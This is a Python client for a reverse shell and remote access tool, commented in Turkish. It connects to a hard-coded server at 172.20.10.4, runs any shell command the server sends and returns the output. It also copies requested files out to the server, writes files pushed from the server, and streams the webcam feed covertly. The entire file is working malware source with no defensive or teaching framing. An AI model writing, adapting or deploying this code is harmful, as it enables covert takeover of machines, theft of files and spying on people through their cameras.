import socket
import os
import subprocess
import cv2, pickle, struct, imutils
import time

SERVER_HOST = "172.20.10.4"
SERVER_PORT = 12345
BUFFER = 1024 # 1KB gönderilen/alınan paketlerin maksimum boyutu

pport = SERVER_PORT

# separator string'i tek seferde iki mesaj gönderirken/alırken, iki mesajı birbirinden ayırmak için kullanılır
SEPARATOR = "<sep>"


baglanti = socket.socket()

baglanti.connect((SERVER_HOST, SERVER_PORT))

# mevcut çalışma dizinini al
cwd = os.getcwd()
baglanti.send(cwd.encode())

while True:
    # sunucudan komutu alma
    command = baglanti.recv(BUFFER).decode()
    splited_command = command.split()

    if command.lower() == "exit":
        # eğer komut "exit" ise döngüyü kır.
        break
    if splited_command[0].lower() == "cd":
        # cd komutu, dizin değiştirmek için
        try:
            os.chdir(' '.join(splited_command[1:]))
        except:
            output = subprocess.getoutput(command, encoding='oem')
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            baglanti.send(message.encode())
            continue
        else:
            # eğer başarılı olursa, boş mesaj gönder
            output = ""
    if command.lower() == "indir":
        dosya_ismi = baglanti.recv(BUFFER).decode() # istenilen dosyanın adını aldık
        
        file = open(dosya_ismi, "rb") # dosyayı açtık
        
        data = file.read() # veriyi okuduk
        baglanti.send(data) # dosyayı gönderdik
        file.close()
        
        baglanti.close()

        time.sleep(7)

        pport += 1
        baglanti = socket.socket()
        baglanti.connect((SERVER_HOST, pport))
        cwd = os.getcwd()
        baglanti.send(cwd.encode())
        continue
        
    if command.lower() == "gonder":
        dosya_ismi = baglanti.recv(BUFFER).decode() # gelecek dosyanın adını aldık
        
        file = open(dosya_ismi, "wb") # dosyayı oluşturduk
        
        while True:
            data = baglanti.recv(1024)
            if not data:
                file.close()
                baglanti.close()

                time.sleep(7)
                
                pport += 1
                baglanti = socket.socket()
                baglanti.connect((SERVER_HOST, pport))
                cwd = os.getcwd()
                baglanti.send(cwd.encode())
                break
            file.write(data)
        continue
    
    if command.lower() == "webcam_izle":
        while True:
            vid = cv2.VideoCapture(0)
            while(vid.isOpened()):
                img, frame = vid.read()
                frame = imutils.resize(frame,width=320)
                a = pickle.dumps(frame)
                message = struct.pack("Q",len(a))+a
                baglanti.sendall(message)
                
                #cv2.imshow('TRANSMITTING VIDEO',frame)
                #key = cv2.waitKey(1) & 0xFF
                #if key == ord('q'):
                #    baglanti.close()
                
                if baglanti.recv(BUFFER).decode() == "quit":
                    baglanti.close()
                    vid.release()
                    break
            break
        pport += 1
        baglanti = socket.socket()
        baglanti.connect((SERVER_HOST, pport))
        cwd = os.getcwd()
        baglanti.send(cwd.encode())
        continue
                    
    else:
        output = subprocess.getoutput(command, encoding='oem')
    
    # mevcut çalışma dizinini çıktı olarak alıyoruz
    cwd = os.getcwd()
    # sonuçları gönderiyoruz
    message = f"{output}{SEPARATOR}{cwd}"
    baglanti.send(message.encode())

# balantıyı sonladırıyoruz
baglanti.close()